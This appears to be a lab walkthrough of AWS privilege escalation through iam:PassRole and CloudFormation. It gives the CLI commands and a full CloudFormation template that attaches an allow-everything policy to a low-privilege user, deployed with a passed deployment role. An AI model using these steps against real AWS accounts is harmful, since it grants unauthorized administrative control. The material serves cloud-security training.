### Pass Role : CloudFormation

List AWS managed policies attached to the user and try to create a user.
```

aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena
aws iam list-user-policies --user-name student --profile PTAcademyJllerena
aws iam create-user --user-name Bob --profile PTAcademyJllerena

```

Check the policy permissions and details. `aws iam get-user-policy --user-name student --policy-name terraform-20230312061123165200000001 --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/224528133-2890d298-7c22-4515-9da6-88601bb81feb.png)

List role on AWS account which can be passed to CloudFormation service `aws iam list-roles --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/224528240-63cd8c63-2790-4d56-bd90-5da567ac4805.png)
![image](https://user-images.githubusercontent.com/46797181/224528273-bc25821f-d474-46a5-800a-f23c3d3b6c07.png)

Check lab12CFDeployRole role details.
```
aws iam list-role-policies --role-name lab12CFDeployRole --profile PTAcademyJllerena
aws iam get-role-policy --role-name lab12CFDeployRole --policy-name terraform-20230312061123641100000003 --profile PTAcademyJllerena
```
![image](https://user-images.githubusercontent.com/46797181/224528385-2e9392b2-9ab1-4f97-b70b-dfe542ec55f3.png)

Create a JSON file with the following content
```
{
"Resources" : {
 "EvilTemplate" : {
  "Type" : "AWS::IAM::Policy",
  "Properties" : {
   "PolicyName" : "admin_policy",
   "PolicyDocument" : {
    "Version" : "2012-10-17",
    "Statement" : [
    {
      "Effect" : "Allow",
      "Action" : "*",
      "Resource" : "*"
    }
   ]
 },
   "Users" : [
   "student"
    ]
   }
  }
 }
}
```
Create a new cloudformation stack on the AWS account with help of the created JSON file. `aws cloudformation create-stack --stack-name ad-stack --template-body file://jll.json --capabilities CAPABILITY_NAMED_IAM --role-arn arn:aws:iam::013566348973:role/lab12CFDeployRole --profile PTAcademyJllerena`

Check the stack information and check the stack execution event status. 
```
aws cloudformation describe-stacks --stack-name ad-stack --profile PTAcademyJllerena
aws cloudformation describe-stack-events --stack-name ad-stack --profile PTAcademyJllerena
```
![image](https://user-images.githubusercontent.com/46797181/224528654-35f72195-d2d0-4f6e-9289-ff29ab7d1bd2.png)

Listing user policies will show that student user has admin policies `aws iam list-user-policies --user-name student --profile PTAcademyJllerena`

Getting the details of admin policy will show that it has full permissions and now is possible to create a new user 

```
aws iam get-user-policy --user-name student --policy-name admin_policy --profile PTAcademyJllerena
aws iam create-user --user-name jllerena --profile PTAcademyJllerena
```
![image](https://user-images.githubusercontent.com/46797181/224528867-76c113d6-6120-469e-9db3-d84095790ab6.png)

Privilege escalation has been achieved 
